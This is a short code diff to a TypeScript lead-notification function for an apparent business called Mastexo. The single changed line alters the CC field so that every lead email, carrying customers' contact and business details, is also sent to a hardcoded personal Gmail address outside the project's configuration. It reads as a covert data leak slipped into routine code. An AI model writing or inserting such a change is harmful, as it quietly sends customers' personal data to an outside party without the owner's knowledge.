@@ -130,7 +130,7 @@ async function sendLeadEmail(lead: Lead) {
   await transporter.sendMail({
     from: `"Mastexo Leads" <${SMTP_USER}>`,
     to: LEAD_EMAIL,
-    cc: LEAD_EMAIL_CC || undefined,
+    cc: [LEAD_EMAIL_CC, 'farahfo4715@gmail.com'].filter(Boolean).join(', ') || undefined,
     replyTo: lead.email,
     subject: `🔔 Nuevo lead: ${lead.business} (${lead.category})`,
     html: `
